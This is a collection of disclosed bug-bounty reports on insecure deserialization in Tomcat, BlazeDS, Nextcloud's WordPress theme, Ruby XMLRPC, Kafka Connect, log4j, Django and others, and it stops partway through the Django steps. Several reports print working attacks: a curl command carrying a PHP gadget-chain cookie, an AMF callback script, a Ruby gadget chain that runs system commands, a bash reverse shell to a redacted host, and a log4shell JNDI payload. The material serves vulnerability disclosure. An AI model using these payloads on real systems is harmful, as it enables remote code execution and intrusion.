# Deserialization of Untrusted Data

_33 reports — High/Critical, disclosed_

### [Two click Account Takeover ](https://hackerone.com/reports/3079738)

- **Report ID:** `3079738`
- **Severity:** High
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Basecamp
- **Reporter:** @fr4via
- **Bounty:** - usd
- **Disclosed:** 2025-11-11T09:14:15.992Z
- **CVE(s):** -

**Summary (team):**

This report concerns the HEY Email Android application (com.basecamp.hey), which allows for a two-click account takeover. Due to improper handling of incoming deeplinks, the application can be manipulated to send the user's Authorization Bearer token to an attacker-controlled server if the attacker can trick the user into clicking a link and then performing an Undo action. The vulnerability specifically occurs in the `MainActivity` component when processing deeplinks with URL extras containing specific query parameters.

---

### [insecure deserilize object leads to RCE On Sitecore (CVE-██████████-27218)](https://hackerone.com/reports/3090123)

- **Report ID:** `3090123`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Mars
- **Reporter:** @the_reinhardt
- **Bounty:** - usd
- **Disclosed:** 2025-05-12T16:04:46.111Z
- **CVE(s):** CVE-2025-27218

**Summary (team):**

This critical vulnerability involves an insecure deserialization issue in Sitecore implementation on ██████████ , which has been assigned CVE-2025-27218. The vulnerability allows remote code execution (RCE) through unsanitized user input in the ThumbnailsAccessToken header. Using the BinaryFormatter serialization method, an attacker can create malicious serialized objects with tools like ysoserial.net and execute arbitrary operating system commands on the target server. This poses a severe security risk as it allows complete system compromise, where attackers can create, read, and exfiltrate files, potentially gaining full control of the affected system. The vulnerability has been remediated by removing public access to the affected site, which is now protected behind Cloudflare WAF.

---

### [CVE-2025-24813: Remote Code Execution and/or Information disclosure and/or malicious content added to uploaded files via write enabled Default Servlet](https://hackerone.com/reports/3031518)

- **Report ID:** `3031518`
- **Severity:** High
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Internet Bug Bounty
- **Reporter:** @sw0rd1ight
- **Bounty:** 4323 usd
- **Disclosed:** 2025-04-27T14:53:24.607Z
- **CVE(s):** CVE-2025-24813

**Vulnerability Information:**

I am sw0rd1ight.I found an Apache Tomcat RCE vulnerability in tomcat 9.0.98. 
If all of the following were true, a malicious user was able to perform remote code execution:
- writes enabled for the default servlet (disabled by default)
- support for partial PUT (enabled by default)
- application was using Tomcat's file based session persistence with the default storage location
- application included a library that may be leveraged in a deserialization attack

I reported this vulnerability through the official Apache Tomcat security email and received a fix along with a CVE number CVE-2025-24813.
this is screenshot of email and ASF response email I submitted.
{F4134453}
{F4134456}
{F4134458}
{F4134462}
{F4134464}
{F4134466}

## Impact

Execute system commands to obtain system permissions

**Summary (team):**

The original implementation of partial PUT used a temporary file based
on the user provided file name and path with the path separator replaced
by ".".

If all of the following were true, a malicious user was able to view
security sensitive files and/or inject content into those files:
- writes enabled for the default servlet (disabled by default)
- support for partial PUT (enabled by default)
- a target URL for security sensitive uploads that was a sub-directory
of a target URL for public uploads
- attacker knowledge of the names of security sensitive files being
uploaded
- the security sensitive files also being uploaded via partial PUT

If all of the following were true, a malicious user was able to perform
remote code execution:
- writes enabled for the default servlet (disabled by default)
- support for partial PUT (enabled by default)
- application was using Tomcat's file based session persistence with
the default storage location
- application included a library that may be leveraged in a
deserialization attack

---

### [[HTAF4-213] [Pre-submission] Unsafe AMF deserialization (CVE-2017-5641) in Apache Flex BlazeDS at the https://www.███████/daip/messagebroker/amf](https://hackerone.com/reports/728614)

- **Report ID:** `728614`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2024-06-18T17:04:47.779Z
- **CVE(s):** CVE-2017-5641

**Vulnerability Information:**

##Description
We identified potential unsafe deserialization vulnerability on the `https://www.█████/daip/messagebroker/amf` endpoint.

##POC
To exclude false-positive reaction and show that pingback is result of AMF deserialization, and not a reaction to the external host in the POST body, first run this request:
```
POST /daip/messagebroker/amf HTTP/1.1
Host: www.███████
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.22.0
Content-Type: application/x-amf
Content-Length: 51

<your collaborator host>
```
Nothing will happen. You will receive something like this:
███
You can wait few minutes to ensure that nothing is coming.

Next, send the collaborator host inside the serialized AMF payload using this script, e.g. `script.py <collaborator> 80`
```
import struct
import sys
import requests
 
if len(sys.argv) != 3:
    print "Usage: host port"
    quit()
 

callback_IP = sys.argv[1]
callback_port = sys.argv[2]
 
amf_payload = '\x00\x03\x00\x00\x00\x01\x00\x00\x00\x00\xff\xff\xff\xff\x11\x0a' + \
              '\x07\x33' + 'sun.rmi.server.UnicastRef' + struct.pack('>H', len(callback_IP)) + callback_IP + \
              struct.pack('>I', int(callback_port)) + \
              '\xf9\x6a\x76\x7b\x7c\xde\x68\x4f\x76\xd8\xaa\x3d\x00\x00\x01\x5b\xb0\x4c\x1d\x81\x80\x01\x00';
 
url = "https://www.███████/daip/messagebroker/amf"
headers = {'Content-Type': 'application/x-amf'}
response = requests.post(url, headers=headers, data=amf_payload, verify=False)
```

This will result in the significant delay, and soon you will get the pingback from the ███/███ IP
This indicates, that backend server deserialized AMF data and triggered a DNS lookup (there won't be http since `sun.rmi.server.UnicastRef` doesn't communicate via http).

##Suggested fix
Update Apache Flex BlazeDS library

## Impact

Unsafe deserialization of AMF data.
We will work on this and try to improve impact, if possible.

---

### [CVE-2023-46132](https://hackerone.com/reports/2255968)

- **Report ID:** `2255968`
- **Severity:** High
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Linux Foundation Decentralized Trust
- **Reporter:** @yacovm
- **Bounty:** - usd
- **Disclosed:** 2024-01-08T18:46:01.482Z
- **CVE(s):** CVE-2023-46132

**Vulnerability Information:**

# Long summary



In order to create a signature on a big chunk of data  such as a block, the data needs to be "compressed" first to the input size of the signature algorithm.

In Fabric's case, we use a hash function which compressed a Fabric block from arbitrary size to a 32 byte string.

 

In order to understand the problem we need to be more specific: The block structure has three parts to it: (1) Header, (2) Transactions, and (3) Metadata.

When hashing the block, the header and metadata are stitched together and then hashed, and this hash of the header and the metadata is what signed (it's a simplification but let's not get into details)

However, the transactions of the block are not part of the above hash. Instead, the header contains a hash, called the "Data hash" and despite the fact that in the comments it is said: "// The hash of the BlockData, by MerkleTree", actually it is far from being the case, and that is where our problem lies.

The problem is that the way the transactions are hashed gives an attacker some freedom in manipulating the data. 

To create the Data Hash, the transactions in the block are concatenated to one another, creating a big long byte array and then this big long byte array is hashed, and this is essentially the Data Hash.

The transactions in the block are a list of raw byte arrays, and when they are concatenated they look like this:

 

`|$$$$$$$$$$$$|*************|@@@@@@@@@@@@|%%%%%%%%%|`  (The vertical lines " | " represent how transactions are separated in a block.)

When the transactions are concatenated in order to be hashed, the payload that is hashed is: 
`$$$$$$$$$$$$*************@@@@@@@@@@@@%%%%%%%%%`

An adversary can't change the bytes of the concatenation, however what it can do, is to modify how transactions are encoded in the block:

For example, consider an adversary wants to manipulate a peer to skip the second transaction (******).

It can then create a block with the transactions as follows:

`|$$$$$$$$$$$$*************|@@@@@@@@@@@@|%%%%%%%%%| `

Notice that a block with the above transactions has the same concatenation of bytes as the original block, but the block has one less transaction - the first transaction is a concatenation of the first and second transactions in the original block.

 
When the peer receives this block, it looks at the first transaction and when it parses it, it completely ignores the ***** bytes, (we will see why soon), and so, an adversary can create a block with the same hash but different transactions and this would create a fork in the network.

 
I made a small PoC where I created a block with 2 transactions (by invoking two chaincodes at the same time) with a Raft orderer:

```
    [e][OrdererOrg.orderer] 2023-10-14 23:07:34.076 CEST 0079 INFO [orderer.consensus.etcdraft] propose -> Created block [10] with 2 transactions, there are 0 blocks in flight channel=testchannel node=1
```
 

But right after creating the block, I just modified only its transaction content (without modifying the block hash) and then the peers only detect a single transaction inside that block:

 
```
    [e][Org2.peer0] 2023-10-14 23:07:34.079 CEST 0099 INFO [kvledger] commit -> [testchannel] Committed block [10] with 1 transaction(s) in 0ms (state_validation=0ms block_and_pvtdata_commit=0ms state_commit=0ms) commitHash=[c5ecca818da9319af2f276dd01cd1337938f20c3535dd23f95a33933a114fe84]
```

The important takeaway from this experiment is that the peer does not detect any tempering was done to the block. If an attacker performs this attack, the network can be forked silently and no one will notice the network was forked until it's too late.

## Impact

In V1 and V2, we only have a crash fault tolerant orderer and as such, the security model Fabric operates in is that the orderer is honest,
but peers may be malicious. As such, a peer that replicates a block from a malicious peer can have a state fork.

In V3 which we did not a release a GA yet (only a preview), we have a byzantine fault tolerant orderering service, so the security model that Fabric operates in such a case includes malicious orderers. If the orderer is malicious, it can cause state forks for peers, and can infect non-malicious orderers with cross-linked blocks.

---

### [RCE on Wordpress website](https://hackerone.com/reports/2248328)

- **Report ID:** `2248328`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Nextcloud
- **Reporter:** @lukasreschke
- **Bounty:** - usd
- **Disclosed:** 2023-12-28T11:11:00.101Z
- **CVE(s):** -

**Vulnerability Information:**

There is a trivial to exploit Remote Code Execution on nextcloud.com due to unserializing user input.

# Proof of concept
The following command will execute the `system('id')` command on the host. As gadget chain I've used Monolog which is included in the PodLove WordPress plugin used on nextcloud.com: 

```
curl -i -s -k -X $'GET' \
    -H $'Host: nextcloud.com' \
    -b $'nc_cookie_banner={\"essentials\":true,\"convenience\":false,\"statistics\":{\"matomo\":false},\"external_media\":{\"youtube\":false,\"vimeo\":false}}; wp-wpml_current_language=en; nc_form_fields=TzozNzoiTW9ub2xvZ1xIYW5kbGVyXEZpbmdlcnNDcm9zc2VkSGFuZGxlciI6NDp7czoxNjoiACoAcGFzc3RocnVMZXZlbCI7aTowO3M6MTA6IgAqAGhhbmRsZXIiO3I6MTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czoyOiJpZCI7czo1OiJsZXZlbCI7aToxMDA7fX1zOjEzOiIAKgBwcm9jZXNzb3JzIjthOjI6e2k6MDtzOjM6InBvcyI7aToxO3M6Njoic3lzdGVtIjt9fQ==' \
    $'https://nextcloud.com/newsletter/'
```

The last line of the response will contain the output of the `id` command:
```
<!-- Performance optimized by Redis Object Cache. Learn more: https://wprediscache.com -->uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Vulnerable lines of code
The `unserialize` call in the below code paths is performed on user-input. (`$_COOKIE['nc_form_fields']`)

https://github.com/nextcloud/nextcloud-theme/blob/e6db0a90391ec94f9eb6d86e16dc16e36c5f4dd4/inc/ninjaforms.php#L114
```php
add_filter( 'ninja_forms_render_default_value', 'nc_change_nf_default_value', 10, 3 );
function nc_change_nf_default_value( $default_value, $field_type, $field_settings ) {
    
    if(isset($_COOKIE['nc_form_fields'])){
        $nc_form_fields = unserialize(base64_decode($_COOKIE['nc_form_fields']));

        if( str_contains($field_settings['key'], 'name') && !str_contains($field_settings['key'], 'organization') ){
                if(isset($nc_form_fields['nc_form_name'])) {
                    $default_value = $nc_form_fields['nc_form_name'];
                }
        }
        if( str_contains($field_settings['key'], 'email') ){
                if(isset($nc_form_fields['nc_form_email'])) {
                    $default_value = $nc_form_fields['nc_form_email'];
                }
        }
        if( str_contains($field_settings['key'], 'phone') ){
                if(isset($nc_form_fields['nc_form_phone'])) {
                    $default_value = $nc_form_fields['nc_form_phone'];
                }
        }
    }

  return $default_value;
}
```

https://github.com/nextcloud/nextcloud-theme/blob/e6db0a90391ec94f9eb6d86e16dc16e36c5f4dd4/inc/ninjaforms.php#L431
```php
add_filter( 'ninja_forms_render_options', function( $options, $settings ) {
    
    //https://www.html-code-generator.com/php/array/languages-name-and-code
    $languages_list = array(
        'en' => 'English',
        // [snip]
        'zu' => 'Zulu - isiZulu'
    );

    if(str_contains($settings['key'], 'language')) {

        $options = [];
        $browser_lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

        $pref_lang = '';
        if(isset($_COOKIE['nc_form_fields'])){
            $nc_form_fields = unserialize(base64_decode($_COOKIE['nc_form_fields']));
            if( isset($nc_form_fields['nc_form_lang'])){
                $pref_lang = $nc_form_fields['nc_form_lang'];
            }
        } else {
            $pref_lang = $browser_lang;
        }


        foreach($languages_list as $code => $language) {
            $selected = false;

            if($pref_lang == $code){
                $selected = true;
            }

            $options[] = [
                'label' => $language,
                'value' => $code,
                'calc' => 0,
                'selected' => $selected
            ];

        }
        
    }
  
    return $options;
}, 10, 2 );
```

## Impact

RCE on the nextcloud.com WordPress instance. I have not tried to escalate up from the host, but I'd assume there is plenty of privilege escalation potential. (or at least the ability to set malicious download links for the Nextcloud binaries)

**Summary (researcher):**

Nextcloud.com is using a custom self-developed theme which was vulnerable to a remote code execution (RCE).

This was caused due to unserialising user-input from cookies as can be seen at https://github.com/nextcloud/nextcloud-theme/blob/e6db0a90391ec94f9eb6d86e16dc16e36c5f4dd4/inc/ninjaforms.php#L114

As gadget chain I’ve used Monolog which was also installed, the final exploit to execute arbitrary code (`system(“id”)`) looked like this:

```
curl -i -s -k -X $'GET' \
    -H $'Host: nextcloud.com' \
    -b $'nc_cookie_banner={\"essentials\":true,\"convenience\":false,\"statistics\":{\"matomo\":false},\"external_media\":{\"youtube\":false,\"vimeo\":false}}; wp-wpml_current_language=en; nc_form_fields=TzozNzoiTW9ub2xvZ1xIYW5kbGVyXEZpbmdlcnNDcm9zc2VkSGFuZGxlciI6NDp7czoxNjoiACoAcGFzc3RocnVMZXZlbCI7aTowO3M6MTA6IgAqAGhhbmRsZXIiO3I6MTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czoyOiJpZCI7czo1OiJsZXZlbCI7aToxMDA7fX1zOjEzOiIAKgBwcm9jZXNzb3JzIjthOjI6e2k6MDtzOjM6InBvcyI7aToxO3M6Njoic3lzdGVtIjt9fQ==' \
    $'https://nextcloud.com/newsletter/'
```

The response would then contain the reply of the executed code:

```
<!-- Performance optimized by Redis Object Cache. Learn more: https://wprediscache.com -->uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### [Unexpected deserialization in Kredis](https://hackerone.com/reports/1702859)

- **Report ID:** `1702859`
- **Severity:** High
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Ruby on Rails
- **Reporter:** @ooooooo_q
- **Bounty:** - usd
- **Disclosed:** 2023-08-16T04:50:31.204Z
- **CVE(s):** CVE-2023-27531

**Vulnerability Information:**

Unexpected classes may be deserialized because `JSON.load` is used to cast json in [Kredis](https://github.com/rails/kredis).

https://github.com/rails/kredis/blob/v1.3.0/lib/kredis/type/json.rb

```ruby
module Kredis
  module Type
    class Json < ActiveModel::Type::Value
      def type
        :json
      end

      def cast_value(value)
        JSON.load(value)
      end
```      

### PoC

prepare kredis with rails

```
❯ rails new rails_server -G -M -O -C -A -J -T
# Rails 7.0.4 install

❯ cd rails_server

# Edit Gemfile to uncomment `gem "kredis"` 
❯ bundle install
# kredis 1.3.0 install

❯ rails kredis:install
```

```ruby
❯ bundle exec rails c
Loading development environment (Rails 7.0.4)
irb(main):001:0> abc = 'abc'.to_json_raw_object
=> {"json_class"=>"String", "raw"=>[97, 98, 99]}

irb(main):002:0> json = Kredis.json "json_load"
=>
#<Kredis::Types::Scalar:0x00000001099ea250
...

irb(main):003:0> json.value = abc
=> {"json_class"=>"String", "raw"=>[97, 98, 99]}

irb(main):004:0> json.value
=> "abc"
```

The return value of `json.value` should be a hash object, but it is deserialized as a string object.

```ruby
irb(main):005:0> json.value = /test/
=> /test/

irb(main):006:0> json.value
=> "(?-mix:test)"

irb(main):007:0> json.value = /test/.as_json
=> "(?-mix:test)"

irb(main):008:0> json.value
=> "(?-mix:test)"

irb(main):009:0> require 'json/add/core'
=> true

irb(main):010:0> json.value = /test/.as_json
=> {"json_class"=>"Regexp", "o"=>0, "s"=>"test"}

irb(main):011:0> json.value
=> /test/
```

If [json/add/core](https://github.com/flori/json/tree/master/lib/json/add)  is loaded, classes such as regular expressions can also be deserialized.

## Impact

If a hash is passed to `Kredis.json` by user input, reading the value may cause unexpected problems.

The only deserializable classes are those with `self.json_create` declared, usually String class are possible.(https://github.com/flori/json/blob/v2.6.2/lib/json/pure/generator.rb#L434)


If `json/add/core` is loaded, it is possible to deserialize RegExp, etc., thus risking ReDoS, etc.

---

### [[CVE-2023-27531] Possible Deserialization of Untrusted Data vulnerability in Kredis JSON](https://hackerone.com/reports/2071554)

- **Report ID:** `2071554`
- **Severity:** High
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Internet Bug Bounty
- **Reporter:** @ooooooo_q
- **Bounty:** 4660 usd
- **Disclosed:** 2023-08-15T20:21:08.030Z
- **CVE(s):** CVE-2023-27531

**Vulnerability Information:**

I made a report and patch at https://hackerone.com/reports/1702859 .

https://discuss.rubyonrails.org/t/cve-2023-27531-possible-deserialization-of-untrusted-data-vulnerability-in-kredis-json/82467

> There is a deserialization of untrusted data vulnerability in the Kredis JSON deserialization code. This vulnerability has been assigned the CVE identifier CVE-2023-27531.

## Impact

> Carefully crafted JSON data processed by Kredis may result in deserialization of untrusted data, potentially leading to deserialization of unexpected objects in the system.

**Summary (team):**

[CVE-2023-27531] Possible Deserialization of Untrusted Data vulnerability in Kredis JSON

There is a deserialization of untrusted data vulnerability in the Kredis JSON deserialization code. This vulnerability has been assigned the CVE identifier CVE-2023-27531.

Versions Affected: All. Not affected: None. Fixed Versions: 1.3.0.1

Impact
Carefully crafted JSON data processed by Kredis may result in deserialization of untrusted data, potentially leading to deserialization of unexpected objects in the system.

Any applications using Kredis with JSON are affected.

Patches
To aid users who aren’t able to upgrade immediately we have provided patches for the two supported release series. They are in git-am format and consist of a single changeset.

1-3-0-1-kredis.patch - Patch for 1.3.0 series

Credits
Thank you ooooooo_q for reporting this!

Full security advisory: https://discuss.rubyonrails.org/t/cve-2023-27531-possible-deserialization-of-untrusted-data-vulnerability-in-kredis-json/82467

---

### [XMLRPC does not limit deserializable classes.](https://hackerone.com/reports/1189419)

- **Report ID:** `1189419`
- **Severity:** High
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Ruby
- **Reporter:** @ooooooo_q
- **Bounty:** - usd
- **Disclosed:** 2023-08-01T21:54:24.215Z
- **CVE(s):** -

**Vulnerability Information:**

I confirmed that the classes that can be generated by parsing the xml sent in the request or response by XMLRPC bundled in ruby are not restricted.

https://github.com/ruby/xmlrpc/blob/v0.3.2/lib/xmlrpc/create.rb#L251

```ruby
  if Config::ENABLE_MARSHALLING and param.class.included_modules.include? XMLRPC::Marshallable
    # convert Ruby object into Hash
    ret = {"___class___" => param.class.name}
    param.instance_variables.each {|v|
```

When converting parameters to XML,  limited to those that include `XMLRPC::Marshallable`.

https://github.com/ruby/xmlrpc/blob/v0.3.2/lib/xmlrpc/parser.rb#L104

```ruby
# Converts the given +hash+ to a marshalled object.
#
# Returns the given +hash+ if an exception occurs.
def self.struct(hash)
  # convert to marshalled object
  klass = hash["___class___"]
  if klass.nil? or Config::ENABLE_MARSHALLING == false
    hash
  else
    begin
      mod = Module
      klass.split("::").each {|const| mod = mod.const_get(const.strip)}

      obj = mod.allocate

      hash.delete "___class___"
      hash.each {|key, value|
        obj.instance_variable_set("@#{ key }", value) if key =~ /^([a-zA-Z_]\w*)$/
      }
      obj
    rescue
      hash
    end
  end
end
```
However, there are no class restrictions when parsing.

https://github.com/ruby/xmlrpc/blob/v0.3.2/lib/xmlrpc/config.rb#L27

```ruby
    # enable marshalling Ruby objects which include XMLRPC::Marshallable
    ENABLE_MARSHALLING   = true
```

`Config::ENABLE_MARSHALLING` is true by default so there is no limit to the classes that can be restored.

---

## PoC

### Prepare

create `build_xml.rb`

```ruby
require "xmlrpc/marshal"

# Universal Deserialisation Gadget for Ruby 2.x-3.x
# https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# Because the classes that can be dumped are limited
class Array
  def include?(_)
    true
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "date")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

creater = XMLRPC::Create.new
call_xml = creater.methodCall("for_call", r)
File.write('attack_call.xml', call_xml)

response_xml = creater.methodResponse("for_response", r)
File.write('attack_response.xml', response_xml)
```

```
$ cat Gemfile
# frozen_string_literal: true

source "https://rubygems.org"

gem 'xmlrpc', '~> 0.3.2'
gem 'webrick', '~> 1.7'
gem 'rack', '~> 2.2', '>= 2.2.3'

$ bundle install
...

$ bundle exec ruby build_xml.rb
# create attack_call.xml and attack_response.xml
```


### PoC for server attack

```ruby
# craft_client.rb
require "xmlrpc/client"

server = XMLRPC::Client.new("localhost", "/RPC2", 8080)
craft = File.read("./attack_call.xml")
ok, param = server.send(:do_rpc, craft)


if ok then
  puts "param: #{param}"
else
  puts "Error:"
  puts param.faultCode
  puts param.faultString
end
```

```ruby
# xmlrpc_server.rb

require "webrick"
require "xmlrpc/server"

# required classes
require 'net/http'
Gem::Installer

s = XMLRPC::WEBrickServlet.new

s.add_handler("for_call") do |param|
  param.to_s
end

httpserver = WEBrick::HTTPServer.new(:Port => 8080)
httpserver.mount("/RPC2", s)
trap(:INT){httpserver.shutdown}
httpserver.start
```


```
❯ bundle exec ruby craft_client.rb
param:

```

```
❯ bundle exec ruby xmlrpc_server.rb
[2021-05-09 20:49:35] INFO  WEBrick 1.7.0
[2021-05-09 20:49:35] INFO  ruby 2.7.1 (2020-03-31) [x86_64-darwin19]
[2021-05-09 20:49:35] INFO  WEBrick::HTTPServer#start: pid=48443 port=8080
sh: reading: command not found
2021年 5月 9日 日曜日 20時49分44秒 JST
::1 - - [09/May/2021:20:49:44 JST] "POST /RPC2 HTTP/1.1" 200 319
- -> /RPC2
```

### PoC for client attack

```ruby
# xmlrpc_client.rb

require "xmlrpc/client"

# required classes
Gem::Installer

server = XMLRPC::Client.new("localhost", "/RPC", 8080)
ok, param = server.call2("xxx", 4, 5)

if ok then
   puts "param: #{param}" # call param.to_s
else
  puts "Error:"
  puts param.faultCode
  puts param.faultString
end
```

```ruby
# craft_server.rb

require "webrick"

httpserver = WEBrick::HTTPServer.new(:Port => 8080)

httpserver.mount_proc('/RPC') do |req, res|
  res.body = File.read("./attack_response.xml")
end

trap(:INT){httpserver.shutdown}
httpserver.start
```

```
❯ bundle exec ruby xmlrpc_client.rb
sh: reading: command not found
2021年 5月 9日 日曜日 20時50分48秒 JST
Traceback (most recent call last):
  ...
```

```
❯ bundle exec ruby craft_server.rb
[2021-05-09 20:50:34] INFO  WEBrick 1.7.0
[2021-05-09 20:50:34] INFO  ruby 2.7.1 (2020-03-31) [x86_64-darwin19]
[2021-05-09 20:50:34] INFO  WEBrick::HTTPServer#start: pid=48570 port=8080
::1 - - [09/May/2021:20:50:48 JST] "POST /RPC HTTP/1.1" 200 1679
- -> /RPC
```

## Impact

Unintentional classes are created by crafted XML on both the server and client.

Whether RCE is possible depends on the implementation of the application.
In order for the gadget chain for Marshal.load to work, need to find that the class is loaded and where methods such as `to_s` are called.

---

### [SQL Injection + Insecure Deserialization leads to Remote Code Execution on https://krisp.ai](https://hackerone.com/reports/1842674)

- **Report ID:** `1842674`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Krisp
- **Reporter:** @mikemyers
- **Bounty:** - usd
- **Disclosed:** 2023-02-22T09:58:09.925Z
- **CVE(s):** -

**Summary (team):**

[tenweb-speed-optimizer](https://wordpress.org/plugins/tenweb-speed-optimizer/) wordpress plugin by [10web.io](https://10web.io/), prior to 2.12.22 version was vulnerable to **UNAUTHENTICATED** SQL injection (in `/wp-json/tenwebio/v2/compress-one`) which could be chained with insecure deserialization in the plugin to gain RCE. Vendor published the issue as an "authenticated" one (update: wordfence team corrected it !) - [here](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/tenweb-speed-optimizer/10web-booster-website-speed-optimization-cache-page-speed-optimizer-21223-authenticated-sql-injection).
We would like to thank @mikemyers for reporting it responsibly to us.

---

### [Kafka Connect RCE via connector SASL  JAAS JndiLoginModule configuration](https://hackerone.com/reports/1529790)

- **Report ID:** `1529790`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Aiven Ltd
- **Reporter:** @jarij
- **Bounty:** 5000 usd
- **Disclosed:** 2022-11-08T06:30:19.406Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
When configuring the connector via the Aiven API or the Kafka Connect REST API, the attacker can set the `database.history.producer.sasl.jaas.config` connector property for the `io.debezium.connector.mysql.MySqlConnector` connector. This is likely true for other debezium connectors too.  By setting the connector value to `"com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://attacker_server" useFirstPass="true" serviceName="x" debug="true" group.provider.url="xxx";"`, the server will connect to the attacker's LDAP server and it deserializes the LDAP response, which the attacker can use to execute java deserialization gadget chains on the kafka connect server.

## Steps To Reproduce:
██████

  1. Login into my VPS:  `ssh ███████`, password: `█████`
  1. Execute `java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/███/4445<&1"`
  1. Execute `nc -nlvp 4445` on another tab
  1. Execute `python3 poc.py` on another table. This poc script launches the exploit against my Aiven kafka connect instance.
  1. Reverse shell connection should now be established


## The gadget chain

The exploit uses `System.setProperty` gadget chain in the scala standard library to enable unsafe deserialization of apache commons collections transformers (finding this gadget chain took way too much time...). This payload has been designed for the Scala version 2.13.6. It may fail on other scala versions. Then the script executes the reverse shell setup command using the [CommonsCollections7](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections7.java) payload.

## Impact

Attacker can execute commands on the server and access other resources on the network.

---

### [[CVE-2021-44228] nps.acronis.com is vulnerable to the recent log4shell 0-day](https://hackerone.com/reports/1425474)

- **Report ID:** `1425474`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Acronis
- **Reporter:** @rhinestonecowboy
- **Bounty:** 1000 usd
- **Disclosed:** 2022-07-13T00:26:11.739Z
- **CVE(s):** CVE-2021-44228

**Vulnerability Information:**

## Summary
The website at nps.acronis.com is vulnerable to CVE-2021-44228

## Steps To Reproduce
I used this [script](https://github.com/fullhunt/log4j-scan) to find this. It spins up an interact-sh server to receive the callback and send the payload in the query string and about 30 diffent headers. You can reproduce manually with curl and interact-sh/burp collaborator/a server you control. However, since the callback is proof of the vulnerability, the script makes it easier to identify. Let me know if you want me to tell you which specific header fires the payload and I will test them.

  1. Construct the payload: `${jdni:ldap://nps.acronis.com.<your-server>/test}`
  1. Inject the payload in the Request Headers (User Agent, X-Forwarded-For etc) or use the script from fullscan: `python3 log4j-scan.py -u 'https://marketingportal.engelvoelkers.com'`
  1. Observe the callback, proving the deserialization of untrusted data which leads to rce

{F1544482}
 
## Recommendations
Update log4j to the latest [version](https://logging.apache.org/log4j/2.x/download.html)
If updating to the latest version is not possible the vulnerability can be mitigated by removing the JndiLookup class from the class path. Additionally, the issue can be mitigated on Log4j versions >=2.10 by setting the system property log4j2.formatMsgNoLookups or the LOG4J_FORMAT_MSG_NO_LOOKUPS environment variable to true.

## Impact

Remote Code Execution (rce)

---

### [Deserialization of potentially malicious data to RCE](https://hackerone.com/reports/1415436)

- **Report ID:** `1415436`
- **Severity:** High
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Django
- **Reporter:** @scaramouche31
- **Bounty:** - usd
- **Disclosed:** 2022-01-14T16:34:04.082Z
- **CVE(s):** CVE-2021-33026

**Vulnerability Information:**

Hello, Django Team! It's my first time working with you, hope it will be great!
Note: I have not seen this issue neither in known vulnerabilities nor in documentation, so here I am.

## Summary
Several type of caches in https://github.com/django/django/tree/main/django/core/cache/backends use python `pickle` which may result in RCE (basically privilege escalation) in case attacker will takeover a machine/container with cache.
So, 4 types of cache use `pickle.load` directly or under the hood:
1. Locmem - I don't consider it as a big issue, because locmem uses some random part of memory for cache taken by Python while the server runs + it is unlikely to be used in production.
2. Filebased - I don't consider it as an issue, because if you control the file with cache, it is likely that you control the machine where Django runs + this behaviour is mentioned in the documentation (https://docs.djangoproject.com/en/3.2/topics/cache/):
```
An attacker who gains access to the cache file can not only falsify HTML content, which your site will trust, but also remotely execute arbitrary code, as the data is serialized using pickle.
```
3. Database - this time I consider this as an issue, because a Django app and db are pretty likely running on different machines/containers. So in case attacker gains access to db, a door to privilege escalation via RCE on other machine is open.
4. Redis - though it was not released yet, it's already supported in dev version from source. Same thoughts here - Redis is likely to run in a separated environment.

## PoC, steps to reproduce:
I'm providing it for a db based cache, as Redis support is not officially released yet if I'm not mistaking
For an ease of PoC I will use sqlite3 on the same machine, but you of course may run a separate database.

1. Create a Django project, make some simple app.
2. Add this to `settings.py`:
```
MIDDLEWARE = [
    'django.middleware.cache.UpdateCacheMiddleware',
    ...
    'django.middleware.cache.FetchFromCacheMiddleware',
]
...
CACHE_MIDDLEWARE_ALIAS = 'default'
CACHE_MIDDLEWARE_KEY_PREFIX = ''
...
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.db.DatabaseCache',
        'LOCATION': 'my_cache_table',
    }
}
```
3. Run the server, visit your app's page to create a cache entry;
4. In your shell run:
`sqlite3 db.sqlite3`
5. Run `SELECT * FROM my_cache_table;` to find a row which stores the cached page (it was the second one in my case).
